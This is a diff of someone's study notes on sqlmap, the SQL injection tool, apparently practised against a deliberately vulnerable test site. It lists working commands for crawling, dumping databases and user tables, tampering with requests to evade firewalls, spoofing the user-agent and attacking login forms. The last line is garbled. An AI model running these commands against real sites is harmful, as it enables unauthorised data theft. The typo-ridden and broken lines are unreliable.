@@ -1,1 +1,87 @@
-sql
+>>crawl
+-How deep of a website do you want to enter?
+sqlmap -u http://testphp.vulnweb.com/ --crawl 2
+
+>>batch
+--batch function choose the default option[Y/n]
+sqlmap -u http://testphp.vulnweb.com/ --crawl 2 --batch
+
+>>Technique
+sqlmap -u http://testphp.vulnweb.com/ --crawl 2 --batch --technique="U"
+
+B: Boolean-based blind
+E: Error-based
+U: Union query-based
+S: Stacked queries
+T: Time-based blind
+Q: Inline queries
+
+--technique-"B"
+
+>>Thread
+sqlmap -u http://testphp.vulnweb.com/ --crawl 2 --batch --threads 5 
+threads by default 1 and we can increase it into 10
+how many connection we need to use for test - use for big website
+
+>>Risk
+sqlmap -u http://testphp.vulnweb.com/ --crawl 2 --batch --risk 1
+in risk there are three value 1,2,3
+1 - not hearmful
+2 - Medium
+3 - harmful(combined of 1 and 2)
+
+>>level
+sqlmap -u http://testphp.vulnweb.com/ --crawl 2 --batch --level 1
+level 1 to 5
+User-agent
+Cookie
+
+>>verbosity
+sqlmap -u http://testphp.vulnweb.com/ --crawl 2 --batch -v 4
+0 to 6
+0: Show only Python tracebacks, error and critical messages.
+
+1: Show also information and warning messages.
+2: Show also debug messages.
+3: Show also payloads injected.
+4: Show also HTTP requests.
+5: Show also HTTP responses' headwall
+6: Show also HTTP responses' page content.
+
+>>user enumeration
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --current-user --current-db --host --batch
+if we found vulnarable website how we collect the information
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D king --tables
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D king -T users --dump
+&n
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D king -T users --columns
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D king --dump-all
+
+>>output dir
+sqlmap -u http://testphp.vulnweb.com/ --crawl 3 --output-dir="home/red404/temp/" --batch
+save data
+>>headers
+sqlmap -u http://testphp.vulnweb.com/ --crawl 3 --headers="Referer:abc.com" -v 4 --batch
+>>user agent 
+sqlmap -u http://testphp.vulnweb.com/ --crawl 2 --user-agent="Anon_Chrome" - v 4 --batch
+things need to bypass
+>>mobile user agent 
+sqlmap -u http://testphp.vulnweb.com/ --crawl 2 --mobile -v 4
+
+>>tamper
+sqlmap --list-tempers
+sqlmap -u http://testphp.vulnweb.com/ --crawl 2 --tamper=base64encode -v 3 --batch
+sql injection keywords can block the fire wall
+>>brute force login page
+inspact the page
+sqlmap -u http://testphp.vulnweb.com/ --forms
+sqlmap -u http://testphp.vulnweb.com/ --data="uname=abc&pass=abc&login=submit" --dbs
+
+>>proxy
+payload -> burp suit -> server
+sqlmap -u http://testphp.vulnweb.com/ --crawl 3 --proxy"127.0.0hearmful(by default)
